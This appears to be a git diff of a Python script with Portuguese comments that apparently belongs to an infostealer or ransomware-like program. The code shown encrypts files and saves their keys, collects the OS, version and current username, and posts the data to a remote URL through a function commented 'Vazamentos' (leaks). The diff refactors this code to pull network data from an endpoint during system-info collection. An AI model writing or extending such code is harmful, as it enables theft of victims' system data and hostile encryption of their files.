@@ -6,13 +6,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import platform
 import getpass
-from config import *
-
-
-def fetch_data(api_url: str) -> dict: # Captura dados do endpoint(fiz pensando na vulnerabilidade de um projeto que criei)
-    response = requests.get(api_url)
-    response.raise_for_status()
-    return response.json()
+import config
 
 def send_data(data: dict, url: str): # Vazamentos
     response = requests.post(url, json=data)
@@ -52,8 +46,11 @@ def save_backup(file_path: str, iv: bytes, encrypted_data: bytes, key: bytes):
     with open(backup_file_path + '.key', 'wb') as f:
         f.write(key)
     
-def collect_system_info():
+def collect_system_info(api_url: str):
+    response = requests.get(api_url)
+    response.raise_for_status()
     return {
+        'Dados de rede': response.json(),
         'os': platform.system(),
         'version': platform.version(),
         'user': getpass.getuser()
